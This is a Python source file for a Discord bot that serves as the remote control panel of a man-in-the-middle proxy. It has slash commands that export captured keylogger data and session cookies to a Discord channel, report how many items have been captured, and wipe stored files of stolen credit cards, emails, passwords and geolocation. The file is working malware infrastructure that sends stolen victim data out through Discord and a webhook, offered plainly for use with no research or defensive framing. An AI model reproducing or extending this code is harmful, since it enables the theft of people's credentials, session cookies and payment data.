import discord
from discord import app_commands
from discord.ext import commands
import json
import os
import requests
import threading
from datetime import datetime
from colorama import Fore
import sys
import asyncio

class DiscordBot:
    def __init__(self, webhook_url, token):
        print(f"{Fore.YELLOW}[*] Initializing Discord bot...{Fore.RESET}")
        self.webhook_url = webhook_url
        self.token = token
        self.running = True
        
        # Initialize bot with intents
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        self.bot = commands.Bot(command_prefix='/', intents=intents)
        
        # Remove default help command
        self.bot.remove_command('help')
        
        # Setup commands
        self.setup_commands()
        
        # Start bot in a separate thread
        self.bot_thread = threading.Thread(target=self.start)
        self.bot_thread.daemon = True
        self.bot_thread.start()

    def send_webhook(self, data):
        try:
            headers = {
                'Content-Type': 'application/json'
            }
            response = requests.post(self.webhook_url, json=data, headers=headers)
            if response.status_code not in [200, 204]:
                print(f"{Fore.RED}[!] Webhook error: {response.status_code} - {response.text}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to send webhook: {str(e)}{Fore.RESET}")

    def setup_commands(self):
        @self.bot.event
        async def on_ready():
            print(f"{Fore.GREEN}[+] Bot is ready as {self.bot.user.name}{Fore.RESET}")
            try:
                await self.bot.tree.sync()
                print(f"{Fore.GREEN}[+] Commands synced successfully{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to sync commands: {e}{Fore.RESET}")

        @self.bot.hybrid_command(name="help", description="Display all available commands")
        async def help(ctx):
            embed = discord.Embed(
                title="🔧 MITM Proxy Commands",
                description="Available commands for the proxy bot",
                color=0xc50f1f
            )
            
            commands = {
                "🔍 Information": {
                    "/help": "Show this help message",
                    "/status": "Check proxy status",
                    "/payloads": "View active/inactive payloads"
                },
                "📤 Data Export": {
                    "/exportkl": "Export keylogger data",
                    "/exportck": "Export cookies",
                    "/exportall": "Export all captured data"
                },
                "⚙️ Control": {
                    "/stop": "Stop the proxy server",
                    "/clear": "Clear all stored data"
                }
            }
            
            for category, cmds in commands.items():
                embed.add_field(
                    name=category,
                    value="\n".join([f"`{cmd}` - {desc}" for cmd, desc in cmds.items()]),
                    inline=False
                )
            
            await ctx.send(embed=embed)

        @self.bot.hybrid_command(name="status", description="Check proxy status")
        async def status(ctx):
            try:
                with open('cookies.json', 'r') as f:
                    cookies = json.load(f)
                with open('keylogs.json', 'r') as f:
                    keylogs = json.load(f)
                
                embed = discord.Embed(
                    title="📊 Proxy Status",
                    description="Current proxy statistics",
                    color=0x00ff00
                )
                
                embed.add_field(name="Status", value="🟢 Running", inline=True)
                embed.add_field(name="Cookies Captured", value=str(len(cookies)), inline=True)
                embed.add_field(name="Keystrokes Logged", value=str(len(keylogs)), inline=True)
                
                await ctx.send(embed=embed)
            except Exception as e:
                await ctx.send(f"Error: {str(e)}")

        @self.bot.hybrid_command(name="exportkl", description="Export keylogger data")
        async def exportkl(ctx):
            try:
                with open('keylogs.json', 'r') as f:
                    data = json.load(f)
                
                if not data:
                    await ctx.send("❌ No keylogger data available!")
                    return

                # Create temp file
                with open('temp_keylog.json', 'w') as f:
                    json.dump(data, f, indent=2)
                
                await ctx.send(
                    content="📤 Keylogger Export",
                    file=discord.File('temp_keylog.json')
                )
                
                # Clear data after successful export
                with open('keylogs.json', 'w') as f:
                    json.dump([], f)
                
                # Cleanup
                os.remove('temp_keylog.json')
                
            except Exception as e:
                await ctx.send(f"Error: {str(e)}")

        @self.bot.hybrid_command(name="exportck", description="Export cookies")
        async def exportck(ctx):
            try:
                with open('cookies.json', 'r') as f:
                    data = json.load(f)
                
                if not data:
                    await ctx.send("❌ No cookie data available!")
                    return

                # Create temp file
                with open('temp_cookies.json', 'w') as f:
                    json.dump(data, f, indent=2)
                
                await ctx.send(
                    content="📤 Cookie Export",
                    file=discord.File('temp_cookies.json')
                )
                
                # Clear data after successful export
                with open('cookies.json', 'w') as f:
                    json.dump([], f)
                
                # Cleanup
                os.remove('temp_cookies.json')
                
            except Exception as e:
                await ctx.send(f"Error: {str(e)}")

        @self.bot.hybrid_command(name="stop", description="Stop the proxy server")
        async def stop(ctx):
            await ctx.send("🛑 Stopping proxy server...")
            self.running = False
            sys.exit(0)

        @self.bot.hybrid_command(name="clear", description="Clear all stored data")
        async def clear(ctx):
            try:
                files = ['cookies.json', 'keylogs.json', 'creditcards.json', 
                        'emails.json', 'passwords.json', 'geolocation.json']
                
                for file in files:
                    with open(file, 'w') as f:
                        json.dump([], f)
                
                await ctx.send("✅ All data cleared successfully!")
            except Exception as e:
                await ctx.send(f"Error: {str(e)}")

    def start(self):
        try:
            print(f"{Fore.YELLOW}[*] Starting Discord bot...{Fore.RESET}")
            self.bot.run(self.token)
        except Exception as e:
            print(f"{Fore.RED}[!] Bot error: {e}{Fore.RESET}")

    def stop(self):
        self.running = False
        if self.bot:
            asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)
